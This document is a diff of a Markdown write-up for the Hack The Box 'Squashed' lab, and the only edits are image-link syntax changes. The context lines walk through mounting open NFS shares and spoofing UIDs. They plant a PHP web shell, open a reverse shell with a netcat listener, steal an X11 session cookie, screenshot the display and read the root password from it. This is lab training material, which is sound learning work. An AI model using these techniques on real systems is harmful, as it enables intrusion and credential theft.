@@ -27,7 +27,7 @@ Connect to the HTB server by using the OpenVpn configuration file that’s gener
 
   
 
-![[Squashed/assets/Untitled.png|Untitled.png]]
+![Untitled.png](Squashed/assets/Untitled.png)
 
 ### Step - 02 :
 
@@ -35,7 +35,7 @@ After connecting to the vpn service, click on Join Machine to access the machine
 
   
 
-![[Squashed/assets/Untitled 1.png|Untitled 1.png]]
+![Untitled 1.png](Squashed/assets/Untitled%201.png)
 
   
 
@@ -49,11 +49,11 @@ After joining the machine you could see the IP Address of the target machine.
 
 Now run a standard nmap scan on the target machine by using the obtained IP address.
 
-![[Squashed/assets/Untitled 2.png|Untitled 2.png]]
+![Untitled 2.png](Squashed/assets/Untitled%202.png)
 
 From the obtained results, we could see that the ssh service is running on port 22 and also a Apache web server running on port 80 and rpcbind are running on port 111. We have also discovered some NFS shares.
 
-![[Squashed/assets/Untitled 3.png|Untitled 3.png]]
+![Untitled 3.png](Squashed/assets/Untitled%203.png)
 
   
 
@@ -61,7 +61,7 @@ From the obtained results, we could see that the ssh service is running on port 
 
 From the obtained information we can start our enumeration. First we will take a look at the website that is running on port 80. After surfing the site we found nothing interesting. So now we can start enumerating the NFS shares that we have discovered in the initial nmap scan.
 
-![[Squashed/assets/Untitled 4.png|Untitled 4.png]]
+![Untitled 4.png](Squashed/assets/Untitled%204.png)
 
 ### Step - 06:
 
@@ -71,7 +71,7 @@ From the obtained information we can start our enumeration. First we will take a
     
     `showmount -e <IP-ADDRESS>`
     
-    ![[Squashed/assets/Untitled 5.png|Untitled 5.png]]
+    ![Untitled 5.png](Squashed/assets/Untitled%205.png)
     
     We can see two file-shares. These shares are globally accessible which is denoted by the start ( * ). Now we can access these shares and look into the contents of these shares. To do that we have to manually mount the NFS shares to our local Kali machine.
     
@@ -79,23 +79,23 @@ From the obtained information we can start our enumeration. First we will take a
     
 2. To mount the NFS shares, First we have to create two directories for mounting them. I have created two directories `ross` and `html` to mount the shares `/home/ross` and `/var/www/html` respectively.
     
-    ![[Squashed/assets/Untitled 6.png|Untitled 6.png]]
+    ![Untitled 6.png](Squashed/assets/Untitled%206.png)
     
 3. Next we have to mount these shares by using the command:
     
     `sudo mount -t nfs <IP-ADDRESS>:<TARGET-SHARE-NAME> <MOUNTING-LOCATION>`
     
-    ![[Squashed/assets/Untitled 7.png|Untitled 7.png]]
+    ![Untitled 7.png](Squashed/assets/Untitled%207.png)
     
-    ![[Squashed/assets/Untitled 8.png|Untitled 8.png]]
+    ![Untitled 8.png](Squashed/assets/Untitled%208.png)
     
 4. Now we have mounted the shares to our local machine. Now let’s take a look at these shares. First we will take a look at the `/home/ross` share by switching the directory to `ross` .
 
-![[Squashed/assets/Untitled 9.png|Untitled 9.png]]
+![Untitled 9.png](Squashed/assets/Untitled%209.png)
 
 1. We have discovered a `Passwords.kdbx` file. This file is a **keypass database** file. Let’s try to crack this by using the `keypass2john` tool. The command is `keypass2john <FILE>` .
 
-![[Squashed/assets/Untitled 10.png|Untitled 10.png]]
+![Untitled 10.png](Squashed/assets/Untitled%2010.png)
 
 `keepass2john` throws an error that this version of Keypass database is not supported by it. So we can do nothing with this file. So let’s further search for anything interesting.
 
@@ -103,19 +103,19 @@ From the obtained information we can start our enumeration. First we will take a
 
 1. We haven’t found anything interesting in the `/home/ross` share so we can now take a look at the `/var/www/html` share by switching the directory to the `html` directory. When we try to switch directory, we are facing with a ==permission denied== error. If we run the command `ls -al` , we could see that the `html` share has user id of 2017. This means that this particular share can be accessed only by the user who has an id of 2017.
 
-![[Squashed/assets/Untitled 11.png|Untitled 11.png]]
+![Untitled 11.png](Squashed/assets/Untitled%2011.png)
 
   
 
 1. To bypass this access control, we will create a user with a user id of 2017 in our local machine. With this newly created user we can access the `html` share. We create a new user with the desired user id by the following command : `adduser <USERNAME> —uid 2017` .
 
-![[Squashed/assets/Untitled 12.png|Untitled 12.png]]
+![Untitled 12.png](Squashed/assets/Untitled%2012.png)
 
   
 
 1. After creating the user, we switch to the new user created. To switch user we use the command : `su <USERNAME>`. After switching the user we switch directory to the `html` directory and we can start our enumerating process.
     
-    ![[Squashed/assets/Untitled 13.png|Untitled 13.png]]
+    ![Untitled 13.png](Squashed/assets/Untitled%2013.png)
     
     We could see that there is nothing interesting is found in this directory. And we can infer that this directory contains all the files of the website that is hosted on the target. So we could create a simple backdoor in this directory and we could try to get a reverse shell to the target machine.
     
@@ -125,13 +125,13 @@ From the obtained information we can start our enumeration. First we will take a
     
     Backdoor: `<?php echo system($_GET[”cmd”]) ?>`
     
-    ![[Squashed/assets/Untitled 14.png|Untitled 14.png]]
+    ![Untitled 14.png](Squashed/assets/Untitled%2014.png)
     
     We can check whether our backdoor is working by sending a GET request using the cmd parameter that we have created using the backdoor.
     
     GET Request : `http://<IP-ADDRESS>/backdoor.php?cmd=id`
     
-    ![[Squashed/assets/Untitled 15.png|Untitled 15.png]]
+    ![Untitled 15.png](Squashed/assets/Untitled%2015.png)
     
     Our backdoor is working as we get the id of the user of the target machine. Let’s note the user details for further enumeration.
     
@@ -147,7 +147,7 @@ From the obtained information we can start our enumeration. First we will take a
     
     We have to URL encode this reverse shell to use supply it as a parameter in the URL. To do that, use the following site [https://www.urlencoder.org](https://www.urlencoder.org/)[/](https://www.urlencoder.org/) to encode the above mentioned reverse shell.
     
-    ![[Squashed/assets/Untitled 16.png|Untitled 16.png]]
+    ![Untitled 16.png](Squashed/assets/Untitled%2016.png)
     
     After encoding we will obtain a reverse shell like this :
     
@@ -157,7 +157,7 @@ From the obtained information we can start our enumeration. First we will take a
     
     `nc -nvlp 1234`
     
-    ![[Squashed/assets/Untitled 17.png|Untitled 17.png]]
+    ![Untitled 17.png](Squashed/assets/Untitled%2017.png)
     
     After creating a listener, now we can supply the reverse shell as a parameter in the URL :
     
@@ -165,13 +165,13 @@ From the obtained information we can start our enumeration. First we will take a
     
     Now if we press enter we can see that the site is continuously loading and if check our listener we could see that we have received back a shell.
     
-    ![[Squashed/assets/Untitled 18.png|Untitled 18.png]]
+    ![Untitled 18.png](Squashed/assets/Untitled%2018.png)
     
-    ![[Squashed/assets/Untitled 19.png|Untitled 19.png]]
+    ![Untitled 19.png](Squashed/assets/Untitled%2019.png)
     
 5. Now we can start enumerating the target machine. Let’s first check the `/home/alex` directory.
 
-![[Squashed/assets/Untitled 20.png|Untitled 20.png]]
+![Untitled 20.png](Squashed/assets/Untitled%2020.png)
 
 Hooray!!! we have found the `user.txt` file, our first flag in the home directory of `alex`. Our next step is to find our root flag.
 
@@ -179,15 +179,15 @@ Hooray!!! we have found the `user.txt` file, our first flag in the home director
 
 Lets first try to switch to the root directory.
 
-![[Squashed/assets/Untitled 21.png|Untitled 21.png]]
+![Untitled 21.png](Squashed/assets/Untitled%2021.png)
 
 We can see that we don’t have access to the root directory. Now we have to find a way to escalate our privilege as root. So first we can check the `/etc/passwd` file for finding the other users.
 
-![[Squashed/assets/Untitled 22.png|Untitled 22.png]]
+![Untitled 22.png](Squashed/assets/Untitled%2022.png)
 
 In the `/etc/passwd` file we can see the presence of the `LightDM` display manager. Remember that in our initial stages of enumerating the share `/home/ross` , we had found the presence of `.Xauthority` and `.xsession-errors` files. This show the possibility of some display is connected and configured using the x11 manager.
 
-![[Squashed/assets/Untitled 23.png|Untitled 23.png]]
+![Untitled 23.png](Squashed/assets/Untitled%2023.png)
 
 ### So what is X11 ?
 
@@ -197,7 +197,7 @@ The presence of `.Xauthority` and `.xsession` files in the home directory indica
 
 Let’s check whether any any display is connected in the target machine by running the following command `w`
 
-![[Squashed/assets/Untitled 24.png|Untitled 24.png]]
+![Untitled 24.png](Squashed/assets/Untitled%2024.png)
 
 We can see that the user `ross` has connected to the display of id `:0` .
 
@@ -205,19 +205,19 @@ We can see that the user `ross` has connected to the display of id `:0` .
 
 Now let’s check what does the `.Xauthority` and `.xsession-errors` file contains.
 
-![[Squashed/assets/Untitled 25.png|Untitled 25.png]]
+![Untitled 25.png](Squashed/assets/Untitled%2025.png)
 
 We can see that we don’t have access to these files.
 
-![[Squashed/assets/Untitled 26.png|Untitled 26.png]]
+![Untitled 26.png](Squashed/assets/Untitled%2026.png)
 
 We can see that the `.Xauthority` and `.xsession-errors` files can only be accessed by the user with a `uid` of `1001` . So we have to create user with a `uid` of `1001` to access these files.
 
-![[Squashed/assets/Untitled 27.png|Untitled 27.png]]
+![Untitled 27.png](Squashed/assets/Untitled%2027.png)
 
 Now we have created a new user with a `uid` of `1001` . Now switch to the new user that we have created by using the command `su <USERNAME>`. Now we can try to see contents of the `.Xauthority` file.
 
-![[Squashed/assets/Untitled 28.png|Untitled 28.png]]
+![Untitled 28.png](Squashed/assets/Untitled%2028.png)
 
 We can see that the `.Xauthority` contains the cookie of the `ross` users x11 session. Now we can use this cookie to act as user `ross` and we can gain access to the display. After gaining access, we can take try to take screenshots of the connected display to see the contents of the display.
 
@@ -225,15 +225,15 @@ We can see that the `.Xauthority` contains the cookie of the `ross` users x11 se
 
 Now we have to move this `.Xauthority` cookie file to the `alex` user’s directory to gain access to the display. To do that we will copy this `.Xauthority` file to the `/tmp` folder and we will host a simple http server from the `/tmp` directory.
 
-![[Squashed/assets/Untitled 29.png|Untitled 29.png]]
+![Untitled 29.png](Squashed/assets/Untitled%2029.png)
 
-![[Squashed/assets/Untitled 30.png|Untitled 30.png]]
+![Untitled 30.png](Squashed/assets/Untitled%2030.png)
 
   
 
 Now we have copied the file to the `/tmp` directory. Next step is to host a simple http webserver. We can do this by using the python simple `http.server` module. To do this use the following command : `python -m http.server`
 
-![[Squashed/assets/Untitled 31.png|Untitled 31.png]]
+![Untitled 31.png](Squashed/assets/Untitled%2031.png)
 
   
 
@@ -243,7 +243,7 @@ Now you can see that our `/tmp` is hosted on port `8000`. Now from the reverse s
 
 Command : `wget http://<tun0-IP-ADDRESS>:8000/<FILENAME>`
 
-![[Squashed/assets/Untitled 32.png|Untitled 32.png]]
+![Untitled 32.png](Squashed/assets/Untitled%2032.png)
 
   
 
@@ -251,7 +251,7 @@ Now we have downloaded the `.Xauthority` file to the `/home/alex` directory. Now
 
 `export XAUTHORITY=<LOCATION-TO-THE-FILE>`
 
-![[Squashed/assets/Untitled 33.png|Untitled 33.png]]
+![Untitled 33.png](Squashed/assets/Untitled%2033.png)
 
 Now we have set the cookie successfully. Our next step is to take a screenshot of the display.
 
@@ -259,7 +259,7 @@ Now we have set the cookie successfully. Our next step is to take a screenshot o
 
 To take screenshot we can use the following command :
 
-![[Squashed/assets/Untitled 34.png|Untitled 34.png]]
+![Untitled 34.png](Squashed/assets/Untitled%2034.png)
 
 Reference : [https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11](https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11)
 
@@ -277,29 +277,29 @@ Details of the flags used :
 
 `-display` : specify the display
 
-![[Squashed/assets/Untitled 35.png|Untitled 35.png]]
+![Untitled 35.png](Squashed/assets/Untitled%2035.png)
 
 Now we have successfully obtained the screenshot. Now we have to copy this image to our local machine. To copy this file to our local machine we can make use of the website that is hosted in the target machine. Now move the `scrshot.xwd` file to `/var/www/html` directory. We know that we have access to the `/var/www/html` directory in our local machine as we have mounted the shares. So now check the `/var/www/html` share in our local machine, we can find the `scrshot.xwd` file.
 
 Now we can copy this file to the `/tmp` directory.
 
-![[Squashed/assets/Untitled 36.png]]
+![Untitled 36](Squashed/assets/Untitled%2036.png)
 
 Now we can convert the `scrshot.xwd` file to `png` file in the `/tmp` folder. We can do this by using the following command : `convert scrshot.xwd scrshot.png`
 
-![[Squashed/assets/Untitled 37.png]]
+![Untitled 37](Squashed/assets/Untitled%2037.png)
 
 Now we can open the `scrshot.png` file to see the contents of it.
 
-![[Squashed/assets/Untitled 38.png]]
+![Untitled 38](Squashed/assets/Untitled%2038.png)
 
 We can see a password manager with the root user’s password in the screenshot. Remember that our target machine has the ssh service open in port 22. Now we can use these credentials to ssh into the target machine.
 
-![[Squashed/assets/Untitled 39.png]]
+![Untitled 39](Squashed/assets/Untitled%2039.png)
 
 Now we have gained access to the `root` user. Now we can read the `root.txt` file.
 
-![[Squashed/assets/Untitled 40.png]]
+![Untitled 40](Squashed/assets/Untitled%2040.png)
 
 Hooray!!! we have found the root flag.
 
